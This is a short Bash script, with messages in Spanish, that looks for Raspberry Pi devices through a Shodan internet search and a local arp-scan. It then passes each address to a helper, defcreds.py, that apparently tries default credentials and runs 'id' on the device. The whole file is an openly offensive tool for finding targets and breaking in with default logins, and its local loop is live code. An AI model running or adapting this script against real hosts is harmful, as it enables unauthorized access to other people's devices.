#!/bin/bash

function shodan_sprint()
{
	for ip in $(shodan search --fields ip_str "raspberry")
	do
		echo "[+] Probando para $ip: "
		#python3 defcreds.py $ip "id" 2>/dev/null
	done
}

function local_sprint()
{
	echo "[*] tarjetas de red: "

	ip a | grep -E "^[0-9]" | awk '{print $2}' | tr -d ':'

	read -p "[+] Introduce tarjeta de red:" interfaz

	for ip in $(sudo arp-scan --interface $interfaz --localnet | grep -E -i "(raspberry|pi)" | awk '{print $1}')
	do
		echo "[+] Probando para $ip:"
		python3 defcreds.py $ip "id" 2>/dev/null
	done
}

#local_sprint
shodan_sprint
